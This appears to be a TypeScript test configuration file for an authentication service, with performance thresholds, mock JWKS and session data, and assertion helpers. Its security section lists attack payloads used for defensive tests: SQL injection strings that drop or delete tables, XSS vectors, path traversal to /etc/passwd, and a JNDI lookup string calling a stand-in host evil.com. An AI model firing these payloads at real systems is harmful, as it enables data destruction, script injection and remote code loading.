/**
 * Authentication Test Suite Configuration
 * Centralized configuration for all authentication-related tests
 */

export const AUTH_TEST_CONFIG = {
  // Test environment URLs
  urls: {
    base: process.env.TEST_URL || 'http://localhost:3000',
    jwks: `${process.env.TEST_URL || 'http://localhost:3000'}/.well-known/jwks.json`,
    auth: `${process.env.TEST_URL || 'http://localhost:3000'}/api/auth`,
    login: `${process.env.TEST_URL || 'http://localhost:3000'}/login`
  },

  // Performance thresholds
  performance: {
    jwks: {
      responseTime: {
        mean: 200,      // Average response time < 200ms
        p95: 500,       // 95th percentile < 500ms
        p99: 1000       // 99th percentile < 1000ms
      },
      successRate: 0.99,  // 99% success rate
      cacheHitRate: 0.80  // 80% cache hit rate under load
    },
    auth: {
      responseTime: {
        mean: 500,
        p95: 1000,
        p99: 2000
      },
      successRate: 0.95
    }
  },

  // Load testing parameters
  load: {
    concurrent: {
      light: 10,
      medium: 50,
      heavy: 100
    },
    duration: {
      short: 30000,   // 30 seconds
      medium: 60000,  // 1 minute
      long: 300000    // 5 minutes
    },
    rampUp: {
      slow: 5000,     // 5 seconds
      fast: 1000      // 1 second
    }
  },

  // Security test parameters
  security: {
    timing: {
      samples: 100,
      thresholdMs: 100  // Max timing difference for attack detection
    },
    payloads: {
      sql: [
        "'; DROP TABLE users; --",
        '" OR "1"="1',
        "' UNION SELECT * FROM secrets--",
        '1; DELETE FROM tokens; --'
      ],
      xss: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '"><script>alert(1)</script>',
        '<svg onload=alert(1)>'
      ],
      injection: [
        '${7*7}',
        '{{7*7}}',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/exploit}',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ]
    }
  },

  // Test data factories
  factories: {
    jwks: {
      validKey: {
        kty: 'RSA',
        use: 'sig',
        alg: 'RS256',
        e: 'AQAB'
      },
      multipleKeys: (count: number) => {
        return Array.from({ length: count }, (_, i) => ({
          kty: 'RSA',
          use: 'sig',
          kid: `key-${i + 1}`,
          alg: 'RS256',
          n: `modulus-${i + 1}`,
          e: 'AQAB'
        }));
      }
    },
    user: {
      valid: {
        id: 'test-user-123',
        email: 'test@example.com',
        name: 'Test User',
        picture: 'https://example.com/avatar.jpg'
      }
    },
    session: {
      valid: {
        expires: new Date(Date.now() + 3600000).toISOString(),
        user: {
          id: 'test-user-123',
          email: 'test@example.com',
          name: 'Test User'
        }
      },
      expired: {
        expires: new Date(Date.now() - 3600000).toISOString(),
        user: {
          id: 'test-user-123',
          email: 'test@example.com',
          name: 'Test User'
        }
      }
    }
  },

  // Mock configurations
  mocks: {
    aws: {
      secrets: {
        success: {
          SecretString: JSON.stringify({
            'test-key': {
              kty: 'RSA',
              use: 'sig',
              kid: 'test-key',
              alg: 'RS256',
              n: 'test-modulus',
              e: 'AQAB'
            }
          })
        },
        empty: {
          SecretString: JSON.stringify({})
        },
        invalid: {
          SecretString: 'invalid-json{'
        },
        missing: {}
      },
      errors: {
        notFound: 'ResourceNotFoundException',
        accessDenied: 'UnauthorizedOperation',
        kmsError: 'DecryptionFailureException',
        serviceError: 'InternalServiceErrorException',
        throttling: 'ThrottlingException'
      }
    },
    oauth: {
      google: {
        validCallback: {
          code: 'valid-auth-code-123',
          state: 'valid-state-456'
        },
        errorCallback: {
          error: 'access_denied',
          error_description: 'User denied access'
        }
      }
    }
  },

  // Test timeouts
  timeouts: {
    unit: 10000,        // 10 seconds
    integration: 30000, // 30 seconds
    e2e: 60000,         // 1 minute
    load: 300000,       // 5 minutes
    security: 120000    // 2 minutes
  },

  // Browser configurations for E2E tests
  browsers: {
    desktop: {
      viewport: { width: 1280, height: 720 },
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    },
    mobile: {
      viewport: { width: 375, height: 667 },
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
    },
    tablet: {
      viewport: { width: 768, height: 1024 },
      userAgent: 'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
    }
  },

  // Environment-specific configurations
  environments: {
    development: {
      skipSecurity: false,
      enableDebug: true,
      mockExternalServices: true
    },
    staging: {
      skipSecurity: false,
      enableDebug: false,
      mockExternalServices: false
    },
    production: {
      skipSecurity: false,
      enableDebug: false,
      mockExternalServices: false
    }
  }
};

// Helper functions
export const createMockJWKS = (keyCount: number = 1) => {
  const keys = AUTH_TEST_CONFIG.factories.jwks.multipleKeys(keyCount);
  return { keys };
};

export const createMockRequest = (url: string, headers: Record<string, string> = {}) => {
  return {
    url,
    headers: new Headers(headers),
    method: 'GET'
  };
};

export const getTestTimeout = (testType: keyof typeof AUTH_TEST_CONFIG.timeouts) => {
  return AUTH_TEST_CONFIG.timeouts[testType];
};

export const shouldSkipSecurityTests = () => {
  const env = process.env.NODE_ENV || 'development';
  return AUTH_TEST_CONFIG.environments[env as keyof typeof AUTH_TEST_CONFIG.environments]?.skipSecurity || false;
};

export const isDebugEnabled = () => {
  const env = process.env.NODE_ENV || 'development';
  return AUTH_TEST_CONFIG.environments[env as keyof typeof AUTH_TEST_CONFIG.environments]?.enableDebug || false;
};

// Performance assertion helpers
export const assertPerformance = (stats: { mean: number; p95: number; p99: number }, type: 'jwks' | 'auth') => {
  const thresholds = AUTH_TEST_CONFIG.performance[type].responseTime;

  expect(stats.mean).toBeLessThanOrEqual(thresholds.mean);
  expect(stats.p95).toBeLessThanOrEqual(thresholds.p95);
  expect(stats.p99).toBeLessThanOrEqual(thresholds.p99);
};

export const assertSuccessRate = (successCount: number, totalCount: number, type: 'jwks' | 'auth') => {
  const successRate = successCount / totalCount;
  const threshold = AUTH_TEST_CONFIG.performance[type].successRate;

  expect(successRate).toBeGreaterThanOrEqual(threshold);
};

// Security test helpers
export const assertNoXSS = (content: string) => {
  AUTH_TEST_CONFIG.security.payloads.xss.forEach(payload => {
    expect(content).not.toContain(payload);
  });

  expect(content).not.toContain('<script');
  expect(content).not.toContain('javascript:');
  expect(content).not.toContain('onerror=');
  expect(content).not.toContain('onload=');
};

export const assertNoSQLInjection = (content: string) => {
  AUTH_TEST_CONFIG.security.payloads.sql.forEach(payload => {
    expect(content).not.toContain(payload);
  });
};

export const assertSecureHeaders = (headers: Headers) => {
  expect(headers.get('X-Content-Type-Options')).toBe('nosniff');
  expect(headers.get('Access-Control-Allow-Origin')).toBeTruthy();
};

// Load testing helpers
export const generateConcurrentRequests = async <T>(
  requestFn: () => Promise<T>,
  count: number,
  concurrency: number = AUTH_TEST_CONFIG.load.concurrent.medium
): Promise<Array<{ result: T; duration: number; error?: Error }>> => {
  const results: Array<{ result: T; duration: number; error?: Error }> = [];
  const semaphore = new Array(concurrency).fill(null);

  const executeRequest = async () => {
    const start = performance.now();
    try {
      const result = await requestFn();
      const duration = performance.now() - start;
      return { result, duration };
    } catch (error) {
      const duration = performance.now() - start;
      return { result: null as T, duration, error: error as Error };
    }
  };

  const promises = Array.from({ length: count }, () => executeRequest());
  return await Promise.all(promises);
};

// Statistics calculation
export const calculateStats = (values: number[]) => {
  const sorted = values.sort((a, b) => a - b);
  const mean = values.reduce((sum, v) => sum + v, 0) / values.length;
  const p95 = sorted[Math.floor(sorted.length * 0.95)];
  const p99 = sorted[Math.floor(sorted.length * 0.99)];
  const min = sorted[0];
  const max = sorted[sorted.length - 1];

  return { mean, p95, p99, min, max };
};
